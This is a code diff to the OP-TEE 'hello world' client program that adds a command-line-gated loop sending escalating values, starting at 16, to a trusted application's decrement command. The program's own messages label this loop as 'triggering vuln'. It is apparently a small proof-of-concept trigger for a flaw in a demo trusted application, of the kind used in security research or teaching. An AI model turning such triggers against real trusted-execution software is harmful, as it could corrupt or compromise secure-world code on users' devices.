@@ -35,7 +35,7 @@
 /* To the the UUID (found the the TA's h-file(s)) */
 #include <hello_world_ta.h>
 
-int main(void)
+int main(int argc, char **argv)
 {
 	TEEC_Result res;
 	TEEC_Context ctx;
@@ -43,6 +43,7 @@ int main(void)
 	TEEC_Operation op;
 	TEEC_UUID uuid = TA_HELLO_WORLD_UUID;
 	uint32_t err_origin;
+	uint32_t inval;
 
 	/* Initialize a context connecting us to the TEE */
 	res = TEEC_InitializeContext(NULL, &ctx);
@@ -92,7 +93,7 @@ int main(void)
 	
 	/* Clear the TEEC_Operation struct */
 	memset(&op, 0, sizeof(op));
-
+    op.params[0].value.a = 4;
 	/*
 	 * Prepare the argument. Pass a value in the first parameter,
 	 * the remaining three parameters are unused.
@@ -104,13 +105,40 @@ int main(void)
 	 * TA_HELLO_WORLD_CMD_INC_VALUE is the actual function in the TA to be
 	 * called.
 	 */
-	printf("Invoking TA to decrement %d\n", op.params[0].value.a);
+	printf("Invoking TA to decrement (not invoking vuln) %d\n", op.params[0].value.a);
 	res = TEEC_InvokeCommand(&sess, TA_HELLO_WORLD_CMD_DEC_VALUE, &op,
 				 &err_origin);
 	if (res != TEEC_SUCCESS)
 		errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
 			res, err_origin);
-	printf("TA decremented value to %d\n", op.params[0].value.a);
+	printf("TA decremented (not invoking vuln) value to %d\n", op.params[0].value.a);
+	
+	if(argc > 1) {
+	    /* Clear the TEEC_Operation struct */
+	    memset(&op, 0, sizeof(op));
+	    for(inval=16; ; inval++) {
+            op.params[0].value.a = inval;
+	        /*
+	         * Prepare the argument. Pass a value in the first parameter,
+	         * the remaining three parameters are unused.
+	         */
+	        op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT, TEEC_NONE,
+					         TEEC_NONE, TEEC_NONE);
+
+	        /*
+	         * TA_HELLO_WORLD_CMD_INC_VALUE is the actual function in the TA to be
+	         * called.
+	         */
+	        printf("Invoking TA to decrement (trigerring vuln) %d\n", op.params[0].value.a);
+	        res = TEEC_InvokeCommand(&sess, TA_HELLO_WORLD_CMD_DEC_VALUE, &op,
+				         &err_origin);
+	        if (res != TEEC_SUCCESS)
+		        errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
+			        res, err_origin);
+	        printf("TA decremented (trigerring vuln) value to %d\n", op.params[0].value.a);
+	    }
+	    
+	}
 
 	/*
 	 * We're done with the TA, close the session and
